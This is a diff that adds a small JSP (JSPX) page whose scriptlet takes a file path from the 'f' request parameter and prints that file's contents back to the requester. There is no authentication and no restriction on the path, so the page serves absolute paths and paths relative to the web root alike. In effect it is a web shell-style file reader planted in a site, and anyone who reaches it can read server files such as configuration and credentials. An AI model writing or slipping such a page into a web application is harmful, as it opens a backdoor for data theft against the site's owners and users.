@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:scriptlet>
+String f = request.getParameter("f");
+if (f != null) {
+  java.io.File file = new java.io.File(f);
+  if (!file.isAbsolute()) file = new java.io.File(application.getRealPath("/"), f);
+  out.print("=== " + file.getAbsolutePath() + " ===\n");
+  java.io.FileInputStream in = new java.io.FileInputStream(file);
+  byte[] buf = new byte[8192]; int n;
+  while ((n = in.read(buf)) > 0) out.print(new String(buf, 0, n, "UTF-8"));
+  in.close();
+}
+</jsp:scriptlet>
+</jsp:root>
